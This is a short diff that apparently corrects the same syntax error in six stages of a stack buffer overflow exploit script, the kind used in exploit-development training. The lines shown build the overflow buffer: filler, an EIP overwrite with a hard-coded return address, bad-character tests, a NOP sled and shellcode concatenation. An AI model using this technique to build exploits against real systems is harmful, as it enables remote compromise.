@@ -125,7 +125,7 @@ try:
 	
 	filler = "A" * 780
 	eip = "B" * 4
-	offset "C" * 4
+	offset = "C" * 4
 	buffer = "D" * (1500 - len(filler) - len(eip) - len(offset))
 
 	inputBuffer = filler + eip + offset +buffer
@@ -177,7 +177,7 @@ try:
 	
 	filler = "A" * 780
 	eip = "B" * 4
-	offset "C" * 4
+	offset = "C" * 4
 
 	inputBuffer = filler + eip + offset + badchars
 
@@ -227,7 +227,7 @@ try:
 	
 	filler = "A" * 780
 	eip = "\x83\x0c\x09\x10"
-	offset "C" * 4
+	offset = "C" * 4
 	buffer = "D" * (1500 - len(filler) - len (eip) - len(offset))
 
 	inputBuffer = filler + eip + offset + buffer
@@ -297,7 +297,7 @@ try:
 
 	filler = "A" * 780
 	eip = "\x83\x0c\x09\x10"
-	offset "C" * 4
+	offset = "C" * 4
 
 	inputBuffer = filler + eip + offset + shellcode
 
@@ -366,7 +366,7 @@ try:
 
 	filler = "A" * 780
 	eip = "\x83\x0c\x09\x10"
-	offset "C" * 4
+	offset = "C" * 4
 	nops = "\x90" * 10
 
 	inputBuffer = filler + eip + offset + nops + shellcode
@@ -437,7 +437,7 @@ try:
 
 	filler = "A" * 780
 	eip = "\x83\x0c\x09\x10"
-	offset "C" * 4
+	offset = "C" * 4
 	nops = "\x90" * 10
 
 	inputBuffer = filler + eip + offset + nops + shellcode
